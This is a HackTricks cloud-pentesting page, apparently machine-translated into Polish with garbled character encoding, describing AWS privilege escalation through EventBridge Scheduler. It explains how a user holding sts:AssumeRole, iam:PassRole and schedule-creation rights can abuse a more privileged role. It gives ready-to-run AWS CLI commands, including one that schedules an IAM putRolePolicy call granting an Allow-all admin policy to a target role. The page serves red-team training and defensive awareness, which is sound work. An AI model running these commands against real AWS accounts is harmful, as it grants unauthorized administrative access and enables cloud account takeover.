# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge Scheduler mo偶e by u偶ywany do eskalacji uprawnie poprzez planowanie wywoa do r贸偶nych usug AWS. Wykorzystujc zdolno do wywoywania usug na podstawie harmonogramu, u偶ytkownicy z wystarczajcymi uprawnieniami mog eskalowa uprawnienia. Oto niekt贸re z kluczowych dziaa, kt贸re EventBridge Scheduler mo偶e wywoa, u偶ywajc szablonowych cel贸w:

- Lambda: lambda:InvokeFunction - Wywoaj funkcje Lambda zgodnie z harmonogramem.
- CodeBuild: codebuild:StartBuild - Rozpocznij projekty AWS CodeBuild.
- CodePipeline: codepipeline:StartPipelineExecution - Wyzw贸l wykonania AWS CodePipeline.
- ECS: ecs:RunTask - Uruchom zadania ECS.
- EventBridge: events:PutEvents - Umie zdarzenia w EventBridge.
- Inspector: inspector:StartAssessmentRun - Rozpocznij oceny Amazon Inspector.
- Kinesis: kinesis:PutRecord - Umie rekordy w strumieniach Kinesis.
- Firehose: firehose:PutRecord - Umie rekordy w strumieniach dostarczania Firehose.
- SageMaker: sagemaker:StartPipelineExecution - Rozpocznij wykonania potok贸w SageMaker.
- SNS: sns:Publish - Publikuj wiadomoci do temat贸w SNS.
- SQS: sqs:SendMessage - Wylij wiadomoci do kolejek SQS.
- Step Functions: states:StartExecution - Rozpocznij wykonania AWS Step Functions.

To tylko niekt贸re z szablonowych dziaa, kt贸re EventBridge Scheduler mo偶e wykona. Jednak korzystajc z uniwersalnych cel贸w, mo偶na wywoa wiele innych dziaa w usugach AWS. Uniwersalne cele pozwalaj na bardziej rozbudowane operacje API poza szablonow list.

Wicej informacji o EventBridge Scheduler w:

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `sts:AssumeRole`, `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

U偶ytkownicy z uprawnieniami `sts:AssumeRole`, `iam:PassRole` oraz `scheduler:CreateSchedule lub scheduler:UpdateSchedule` mog eskalowa uprawnienia, wykorzystujc EventBridge Scheduler do wywoywania usug przy u偶yciu roli z wy偶szymi uprawnieniami.

Dziki tym uprawnieniom, atakujcy mo偶e przyj rol z podwy偶szonymi uprawnieniami i przekaza t rol do EventBridge Scheduler podczas tworzenia lub aktualizacji harmonogramu. Harmonogram mo偶na skonfigurowa do wykonania dowolnych dziaa wymienionych wczeniej, takich jak wywoywanie funkcji Lambda, uruchamianie zada ECS, wyzwalanie wykonania CodePipeline lub jakiejkolwiek operacji z 270 usug AWS wspieranych przez EventBridge Scheduler. Poprzez planowanie tych dziaa, atakujcy m贸gby nadu偶y wy偶szych uprawnie do wykonywania nieautoryzowanych operacji w usugach AWS.
\\

Na przykad, mogliby skonfigurowa harmonogram do wywoania funkcji Lambda, kt贸ra jest szablonowym dziaaniem:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
Opr贸cz ztemplatyzowanych dziaa serwisowych, mo偶esz u偶ywa uniwersalnych cel贸w w EventBridge Scheduler, aby wywoa szeroki zakres operacji API dla wielu usug AWS. Uniwersalne cele oferuj elastyczno w wywoywaniu prawie ka偶dego API. Jednym z przykad贸w mo偶e by u偶ycie uniwersalnych cel贸w dodajcych "AdminAccessPolicy", u偶ywajc roli, kt贸ra ma polityk "putRolePolicy":
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## References

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
